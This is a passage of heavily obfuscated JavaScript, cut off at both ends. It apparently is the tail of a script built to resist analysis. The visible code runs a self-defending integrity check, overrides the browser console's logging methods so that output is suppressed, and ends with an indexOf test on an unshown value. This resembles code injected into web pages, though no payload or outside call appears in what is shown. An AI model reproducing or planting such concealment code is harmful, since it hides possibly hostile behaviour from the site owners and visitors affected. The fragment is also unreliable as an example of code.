G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};